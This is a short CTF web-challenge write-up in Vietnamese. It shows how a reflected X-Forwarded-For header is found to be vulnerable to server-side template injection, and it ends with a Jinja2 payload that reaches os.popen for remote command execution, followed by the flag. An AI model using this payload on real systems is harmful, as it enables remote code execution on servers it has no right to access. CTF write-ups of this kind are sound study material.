Thông tin duy nhất ta có ở bài này là dòng "This page is being accessed from the remote address: 42.117.64.2" 

Thử gửi request với `X-Forwarded-For: 42.117.64.2` vẫn không thấy có gì xảy ra. 

Thử với `X-Forwarded-For: 127.0.0.1` và thấy response trả về "This page is being accessed from the remote address: 170.0.0.1" 

Nhận thấy web render ra giá trị của header X-Forwarded-For nhận vào từ request,khả năng là lỗi XSS,SSTI 

Test XSS 

![Test XSS](https://i.imgur.com/S5t4aof.png) 

Test SSTI 

![Test SSTI](https://i.imgur.com/fTB0z80.png) 

Oke rồi,giờ RCE để lấy flag thôi. 

Payload `X-Forwarded-For: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('<COMMAND>').read() }}` 

Flag: CyWeb{m3d!umsst!}
